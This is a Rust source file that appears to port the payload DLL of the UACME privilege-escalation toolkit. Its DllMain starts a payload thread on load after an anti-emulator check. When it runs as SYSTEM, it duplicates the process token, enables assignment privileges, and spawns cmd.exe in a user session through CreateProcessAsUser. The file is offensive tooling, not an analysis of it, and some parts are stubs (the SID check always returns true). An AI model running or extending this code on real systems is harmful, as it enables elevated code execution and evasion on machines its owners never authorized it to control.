// UACME Rust - Akatsuki Payload DLL
// Port of Source/Akatsuki (WOW64 Logger method)

use shared::*;
use windows::core::PCWSTR;
use windows::Win32::Foundation::*;
use windows::Win32::System::SystemServices::*;
use windows::Win32::System::Threading::*;
use windows::Win32::Security::*;
use std::ffi::c_void;

/// Shared parameter block
#[repr(C)]
struct SharedParams {
    crc32: u32,
    session_id: u32,
    akagi_flag: u32,
    parameter: [u16; MAX_PATH as usize + 1],
    desktop: [u16; MAX_PATH as usize + 1],
    winstation: [u16; MAX_PATH as usize + 1],
    signal_object: [u16; MAX_PATH as usize + 1],
}

impl Default for SharedParams {
    fn default() -> Self {
        Self {
            crc32: 0,
            session_id: 0,
            akagi_flag: 0,
            parameter: [0; MAX_PATH as usize + 1],
            desktop: [0; MAX_PATH as usize + 1],
            winstation: [0; MAX_PATH as usize + 1],
            signal_object: [0; MAX_PATH as usize + 1],
        }
    }
}

/// Check if running as LocalSystem
fn is_local_system() -> bool {
    use windows::Win32::Security::*;
    
    unsafe {
        let mut token = HANDLE::default();
        if OpenProcessToken(
            GetCurrentProcess(),
            TOKEN_QUERY,
            &mut token,
        ).is_ok() {
            let mut user_info: Vec<u8> = vec![0; 256];
            let mut return_length = 0u32;
            
            if GetTokenInformation(
                token,
                TokenUser,
                Some(user_info.as_mut_ptr() as *mut _),
                user_info.len() as u32,
                &mut return_length,
            ).is_ok() {
                // Check if SID is LocalSystem
                // TODO: Implement proper SID comparison
                let _ = CloseHandle(token);
                return true; // Simplified for now
            }
            
            let _ = CloseHandle(token);
        }
    }
    
    false
}

/// Launch payload as user
fn launch_payload_as_user(
    session_id: u32,
    parameter: Option<&[u16]>,
) -> bool {
    use windows::Win32::Security::*;

    let mut payload = if let Some(param) = parameter {
        param.to_vec()
    } else {
        let mut sys_dir = query_system_directory(true);
        let cmd = to_wide_string("cmd.exe");
        wstrcat(sys_dir.as_mut_ptr(), cmd.as_ptr());
        sys_dir
    };

    log::info!("Launching payload in session {}", session_id);

    unsafe {
        // Get current process token
        let token_result = winapi_ext::TokenHandle::open_process_token(
            GetCurrentProcess(),
            TOKEN_DUPLICATE.0 | TOKEN_QUERY.0 | TOKEN_ASSIGN_PRIMARY.0,
        );

        let token = match token_result {
            Ok(t) => t,
            Err(e) => {
                log::error!("Failed to open process token: {}", e);
                return false;
            }
        };

        // Duplicate token
        let dup_token = match token.duplicate_token(SecurityImpersonation.0 as u32) {
            Ok(t) => t,
            Err(e) => {
                log::error!("Failed to duplicate token: {}", e);
                return false;
            }
        };

        // Enable necessary privileges
        let _ = winapi_ext::enable_privilege(dup_token.handle(), "SeAssignPrimaryTokenPrivilege");
        let _ = winapi_ext::enable_privilege(dup_token.handle(), "SeIncreaseQuotaPrivilege");

        // Create process as user
        match winapi_ext::create_process_as_user(
            dup_token.handle(),
            None,
            Some(&mut payload),
            None,
            session_id,
        ) {
            Ok(pi) => {
                let _ = CloseHandle(pi.hProcess);
                let _ = CloseHandle(pi.hThread);
                true
            }
            Err(e) => {
                log::error!("Failed to create process as user: {}", e);
                false
            }
        }
    }
}

/// Default payload execution
fn default_payload() {
    // Check for emulator
    if anti_emulator::is_emulator_present() == constants::STATUS_NEEDS_REMEDIATION {
        exit_process(0x666F6666);
    }
    
    // Read shared parameters
    // TODO: Implement shared memory reading
    let shared_params = SharedParams::default();
    
    let parameter = if shared_params.parameter[0] != 0 {
        Some(&shared_params.parameter[..])
    } else {
        None
    };
    
    let session_id = shared_params.session_id;
    
    // Check if we're running as LocalSystem
    let is_system = is_local_system();
    
    let success = if is_system {
        // Running as SYSTEM, create process in user session
        launch_payload_as_user(session_id, parameter)
    } else {
        // Not SYSTEM, just launch normally
        match winapi_ext::create_process_simple(
            &parameter.unwrap_or(&to_wide_string("cmd.exe")),
            None,
            1,
        ) {
            Ok(pi) => {
                unsafe {
                    let _ = CloseHandle(pi.hProcess);
                    let _ = CloseHandle(pi.hThread);
                }
                true
            }
            Err(_) => false,
        }
    };
    
    // Signal completion
    if shared_params.signal_object[0] != 0 {
        unsafe {
            if let Ok(event) = OpenEventW(
                EVENT_MODIFY_STATE,
                false,
                PCWSTR(shared_params.signal_object.as_ptr()),
            ) {
                let _ = SetEvent(event);
                let _ = CloseHandle(event);
            }
        }
    }
    
    // Sleep before exit
    sleep(5000);
    
    exit_process(if success { 1 } else { 0 });
}

/// DLL Main entry point
#[no_mangle]
#[allow(non_snake_case)]
pub extern "system" fn DllMain(
    _hinst_dll: HINSTANCE,
    fdw_reason: u32,
    _lpv_reserved: *mut c_void,
) -> BOOL {
    match fdw_reason {
        DLL_PROCESS_ATTACH => {
            if anti_emulator::is_emulator_present() == constants::STATUS_NEEDS_REMEDIATION {
                exit_process(0x666F6666);
            }
            
            std::thread::spawn(|| {
                default_payload();
            });
            
            TRUE
        }
        _ => TRUE,
    }
}

/// Entry point for EXE mode
#[no_mangle]
#[allow(non_snake_case)]
pub extern "system" fn EntryPointExeMode() {
    if anti_emulator::is_emulator_present() == constants::STATUS_NEEDS_REMEDIATION {
        exit_process(0x666F6666);
    }
    default_payload();
}

